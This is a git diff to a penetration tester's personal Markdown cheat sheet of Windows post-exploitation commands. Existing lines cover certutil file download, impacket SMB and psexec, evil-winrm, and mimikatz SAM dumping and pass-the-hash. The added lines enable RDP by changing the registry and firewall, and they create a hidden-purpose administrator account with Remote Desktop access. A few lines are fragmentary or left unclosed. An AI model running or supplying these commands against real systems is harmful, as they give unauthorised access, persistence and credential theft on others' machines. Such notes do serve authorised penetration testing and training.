@@ -42,14 +42,21 @@ impacket-smbserver share /tmp/smb -smb2support --debug
 
 # Download File   
 certutil -urlcache -split -f <URL> <輸出檔名>  
+iwr
 
 # Windows Remote  
 ## WinRM   
 evil-winrm  
 ## RDP   
 ```xfreerdp3```  
+## Enable RDP  
+``` reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f ```  
+``` net start termservice ```  
+``` netsh advfirewall firewall set rule group="Remote Desktop" new enable=yes ```  
+### Powershell  
+``` Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name fDenyTSConnections -Value 0```  
 ## psexec  
-``impacket-psexec```  
+```impacket-psexec```  
 psexec \\192.168.1.1: cmd.exe  
 ## smbexec   
 ```impacket-smbexec```  
@@ -63,6 +70,14 @@ privilege::debug
 tocke::elevate  
 lsadump::sam  
 sekurlsa::pth /user:administrator /domain:. /ntlm:<ntlm hash>  
+
+#Windows Cr
+# Windows Create New USer for RDP
+``` net user <帳號名稱> <密碼> /add ```
+``` net localgroup administrators <帳號名稱> /add ```  
+``` net localgroup "Remote Desktop Users" <帳號名稱> /add ```  
+```net localgroup administrators ```  
+``` net localgroup "Remote Desktop Users ```  
 
 # GDB  
 ## Install PEDA Plgu-in   
